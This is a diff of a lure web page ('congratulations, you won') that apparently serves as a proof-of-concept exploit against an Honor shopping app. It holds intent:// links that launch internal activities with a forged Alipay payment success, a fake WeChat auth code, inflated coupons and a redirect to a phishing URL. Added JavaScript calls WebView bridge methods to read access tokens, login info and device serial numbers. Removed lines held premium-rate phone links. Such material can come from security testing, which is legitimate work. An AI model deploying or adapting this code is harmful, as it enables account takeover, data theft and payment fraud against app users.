@@ -4,8 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🎉 恭喜中奖！🎉</title>
-    <a href="tel:10086">恶意收费电话1</a>
-     <a href="tel:13297966325">恶意收费电话2</a>
     <style>
         body {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -60,6 +58,30 @@
             font-size: 12px;
             color: #999;
         }
+        .result-box {
+            display: none;
+            background: #f5f5f5;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+            border-left: 4px solid #667eea;
+            text-align: left;
+        }
+        .result-title {
+            font-weight: bold;
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+        .result-content {
+            background: white;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
     </style>
 </head>
 <body>
@@ -76,54 +98,48 @@
         </div>
         
         <!-- 恶意链接 1：启动支付宝回调 Activity -->
-        <a href="intent://#Intent;
-            action=android.intent.action.VIEW;
-            package=cn.honor.qinxuan;
-            class=cn.honor.qinxuan.ui.order.aliPayApi.AlipayCallbackActivity;
-            S.order_id=FAKE_ORDER_99999;
-            S.status=success;
-            S.amount=0.01;
-            end" 
+        <a href="intent://#Intent;action=android.intent.action.VIEW;package=cn.honor.qinxuan;class=cn.honor.qinxuan.ui.order.aliPayApi.AlipayCallbackActivity;S.order_id=FAKE_ORDER_99999;S.status=success;S.amount=0.01;end" 
             class="btn">
             🛍️ 立即领取商品
         </a>
         
         <!-- 恶意链接 2：启动微信授权 Activity -->
-        <a href="intent://#Intent;
-            action=android.intent.action.VIEW;
-            package=cn.honor.qinxuan;
-            class=cn.honor.qinxuan.wxapi.WXEntryActivity;
-            S.code=STOLEN_AUTH_CODE;
-            end" 
+        <a href="intent://#Intent;action=android.intent.action.VIEW;package=cn.honor.qinxuan;class=cn.honor.qinxuan.wxapi.WXEntryActivity;S.code=STOLEN_AUTH_CODE;end" 
             class="btn" 
             style="background: linear-gradient(45deg, #07c160, #06ad56);">
             💬 微信一键登录
         </a>
         
         <!-- 恶意链接 3：启动优惠券中心 -->
-        <a href="intent://#Intent;
-            action=android.intent.action.VIEW;
-            package=cn.honor.qinxuan;
-            class=cn.honor.qinxuan.ui.mine.coupon.CouponCenterActivity;
-            S.coupon_type=VIP;
-            S.amount=99999;
-            end" 
+        <a href="intent://#Intent;action=android.intent.action.VIEW;package=cn.honor.qinxuan;class=cn.honor.qinxuan.ui.mine.coupon.CouponCenterActivity;S.coupon_type=VIP;S.amount=99999;end" 
             class="btn"
             style="background: linear-gradient(45deg, #667eea, #764ba2);">
             🎫 领取 VIP 优惠券
         </a>
         
         <!-- 恶意链接 4：启动外部活动 -->
-        <a href="intent://#Intent;
-            action=android.intent.action.VIEW;
-            package=cn.honor.qinxuan;
-            class=cn.honor.qinxuan.splash.ExternalPullUpActivity;
-            S.activity_url=https://malicious.com/phishing;
-            end" 
+        <a href="intent://#Intent;action=android.intent.action.VIEW;package=cn.honor.qinxuan;class=cn.honor.qinxuan.splash.ExternalPullUpActivity;S.activity_url=https://malicious.com/phishing;end" 
             class="btn"
             style="background: linear-gradient(45deg, #f093fb, #f5576c);">
             🎪 参与限时活动
         </a>
+        
+        <!-- 添加调用 Token 接口的按钮 -->
+        <button class="btn" onclick="callGetTokenAndMemberId()" 
+                style="background: linear-gradient(45deg, #11998e, #38ef7d); margin-top: 20px;">
+            🔑 获取用户 Token 和 MemberId
+        </button>
+        
+        <button class="btn" onclick="callAllAuthInterfaces()" 
+                style="background: linear-gradient(45deg, #f093fb, #f5576c); margin-top: 10px;">
+            🎯 调用所有认证接口
+        </button>
+        
+        <!-- 结果显示区域 -->
+        <div id="resultBox" class="result-box">
+            <div class="result-title">📊 调用结果：</div>
+            <div id="resultContent" class="result-content"></div>
+        </div>
         
         <div class="footer">
             本活动最终解释权归商家所有<br>
@@ -146,12 +162,169 @@
             }
         }, 1000);
         
+        // 显示结果
+        function showResult(message, type = 'info') {
+            const resultBox = document.getElementById('resultBox');
+            const resultContent = document.getElementById('resultContent');
+            
+            resultBox.style.display = 'block';
+            
+            const color = type === 'success' ? '#28a745' : 
+                         type === 'error' ? '#dc3545' : '#17a2b8';
+            
+            resultContent.innerHTML = `<span style="color: ${color}">${message}</span>`;
+        }
+        
+        // 调用 getTokenAndMemberId 接口
+        function callGetTokenAndMemberId() {
+            showResult('⏳ 正在调用 getTokenAndMemberId()...', 'loading');
+            
+            try {
+                // 检查接口是否存在
+                const jsInterface = window.hicareJsInterface || 
+                                   window.myHonorInterfaceOversea || 
+                                   window.myHonorH5JsInterface;
+                
+                if (jsInterface && typeof jsInterface.getTokenAndMemberId === 'function') {
+                    console.log('开始调用 getTokenAndMemberId()');
+                    
+                    // 调用接口
+                    jsInterface.getTokenAndMemberId();
+                    
+                    showResult('✅ 调用成功！\n\n接口已调用，请等待回调结果...\n\n' +
+                              '回调会通过 R7 方法返回：\n' +
+                              'getTokenAndMemberId(\'{"accessToken":"xxx","serviceToken":"","memberId":""}\')', 'success');
+                } else {
+                    showResult('❌ 错误：未找到 getTokenAndMemberId 接口\n\n' +
+                              '可用接口检查：\n' +
+                              '- hicareJsInterface: ' + (typeof window.hicareJsInterface !== 'undefined') + '\n' +
+                              '- myHonorInterfaceOversea: ' + (typeof window.myHonorInterfaceOversea !== 'undefined') + '\n' +
+                              '- myHonorH5JsInterface: ' + (typeof window.myHonorH5JsInterface !== 'undefined'), 'error');
+                }
+            } catch (error) {
+                showResult('❌ 调用失败：' + error.message + '\n\n' + 
+                          '堆栈跟踪：' + error.stack, 'error');
+                console.error('调用错误:', error);
+            }
+        }
+        
+        // 调用所有认证相关接口
+        function callAllAuthInterfaces() {
+            showResult('⏳ 批量调用认证接口...', 'loading');
+            
+            const results = [];
+            
+            try {
+                const jsInterface = window.hicareJsInterface || 
+                                   window.myHonorInterfaceOversea || 
+                                   window.myHonorH5JsInterface;
+                
+                if (!jsInterface) {
+                    showResult('❌ 未找到任何 JavaScript 接口', 'error');
+                    return;
+                }
+                
+                results.push('=== 调用所有认证接口 ===\n');
+                
+                // 1. 获取 Token 和 MemberId
+                results.push('1️⃣ getTokenAndMemberId()');
+                if (typeof jsInterface.getTokenAndMemberId === 'function') {
+                    jsInterface.getTokenAndMemberId();
+                    results.push('   ✅ 已调用（异步回调）\n');
+                } else {
+                    results.push('   ❌ 接口不存在\n');
+                }
+                
+                // 2. 获取 AccessToken
+                results.push('2️⃣ getAccessToken()');
+                if (typeof jsInterface.getAccessToken === 'function') {
+                    const token = jsInterface.getAccessToken();
+                    results.push('   ✅ 返回：' + (token ? token.substring(0, 30) + '...' : 'null') + '\n');
+                }
+                
+                // 3. 获取 AccessTokenFromCache
+                results.push('3️⃣ getAccessTokenFromCache()');
+                if (typeof jsInterface.getAccessTokenFromCache === 'function') {
+                    const token = jsInterface.getAccessTokenFromCache();
+                    results.push('   ✅ 返回：' + (token ? token.substring(0, 30) + '...' : 'null') + '\n');
+                }
+                
+                // 4. 获取 AccessTokenOrServiceToken
+                results.push('4️⃣ getAccessTokenOrServiceToken()');
+                if (typeof jsInterface.getAccessTokenOrServiceToken === 'function') {
+                    const token = jsInterface.getAccessTokenOrServiceToken();
+                    results.push('   ✅ 返回：' + (token ? token.substring(0, 30) + '...' : 'null') + '\n');
+                }
+                
+                // 5. 获取用户信息
+                results.push('5️⃣ getUidHashAndNickName()');
+                if (typeof jsInterface.getUidHashAndNickName === 'function') {
+                    try {
+                        const userInfo = jsInterface.getUidHashAndNickName();
+                        results.push('   ✅ 返回：' + userInfo + '\n');
+                    } catch (e) {
+                        results.push('   ❌ 错误：' + e.message + '\n');
+                    }
+                }
+                
+                // 6. 获取登录信息
+                results.push('6️⃣ checkLoginAndBackLoginInfo()');
+                if (typeof jsInterface.checkLoginAndBackLoginInfo === 'function') {
+                    try {
+                        const loginInfo = jsInterface.checkLoginAndBackLoginInfo();
+                        results.push('   ✅ 返回：' + loginInfo + '\n');
+                    } catch (e) {
+                        results.push('   ❌ 错误：' + e.message + '\n');
+                    }
+                }
+                
+                // 7. 获取设备信息
+                results.push('7️⃣ getDeviceName()');
+                if (typeof jsInterface.getDeviceName === 'function') {
+                    const deviceName = jsInterface.getDeviceName();
+                    results.push('   ✅ 返回：' + deviceName + '\n');
+                }
+                
+                results.push('8️⃣ getDeviceSN()');
+                if (typeof jsInterface.getDeviceSN === 'function') {
+                    const deviceSN = jsInterface.getDeviceSN();
+                    results.push('   ✅ 返回：' + (deviceSN ? deviceSN.substring(0, 30) + '...' : 'null') + '\n');
+                }
+                
+                showResult(results.join('\n'), 'success');
+                
+            } catch (error) {
+                showResult('❌ 批量调用失败：' + error.message, 'error');
+            }
+        }
+        
         // 记录点击
         document.querySelectorAll('.btn').forEach(btn => {
             btn.addEventListener('click', function(e) {
                 console.log('Button clicked:', this.textContent);
             });
         });
+        
+        // 页面加载时检查可用接口
+        window.onload = function() {
+            console.log('=== 可用的 JavaScript 接口 ===');
+            
+            const interfaces = {
+                'hicareJsInterface': window.hicareJsInterface,
+                'myHonorInterfaceOversea': window.myHonorInterfaceOversea,
+                'myHonorH5JsInterface': window.myHonorH5JsInterface
+            };
+            
+            for (const [name, obj] of Object.entries(interfaces)) {
+                if (obj) {
+                    console.log(`✅ ${name} 存在`);
+                } else {
+                    console.log(`❌ ${name} 不存在`);
+                }
+            }
+            
+            console.log('\n页面已加载，准备就绪！');
+        };
     </script>
 </body>
 </html>
